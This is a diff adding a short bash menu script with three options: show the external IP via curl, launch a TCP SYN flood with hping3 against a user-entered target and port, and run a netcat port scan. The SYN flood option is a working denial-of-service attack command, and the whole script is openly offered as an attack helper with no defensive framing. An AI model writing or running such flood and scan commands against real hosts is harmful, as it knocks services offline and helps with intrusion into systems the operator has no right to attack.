@@ -1,0 +1,34 @@
+#!/bin/bash
+options=("Show IP" "TCP SYN Flood" "TCP Port Scanner" "Quit")
+select opt in "${options[@]}"; do 
+	if [ "$opt" = "Quit" ]; then
+	echo "Quitting" && sleep 1 && clear
+	exit 0
+	elif [ "$opt" = "Show IP" ]; then
+	echo "External IP lookup requires curl..." && sleep 1
+	echo "External IP is detected as:"
+	curl http://canihazip.com/s/
+	echo ""
+ 	elif [ "$opt" = "TCP SYN Flood" ]; then
+	echo "TCP SYN Flood requires hping3..." && sleep 1
+	echo "Enter target"
+	read TARGET
+	echo "Enter target port"
+	read PORT
+	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
+	sleep 1
+	sudo hping3 --fast -p $PORT -S $TARGET
+ 	elif [ "$opt" = "TCP Port Scanner" ]; then
+	echo "TCP Port Scanner requires netcat..." && sleep 1
+	echo "Enter target"
+	read TARGET
+	echo "Enter target port (e.g. '80') or port range (e.g. '1-1000')"
+	read PORT
+	echo "Starting TCP Port Scan"
+	sleep 1
+		netcat -zv $TARGET $PORT
+	else
+  	echo  "That's not a valid option!"
+	fi
+done
+exit 0
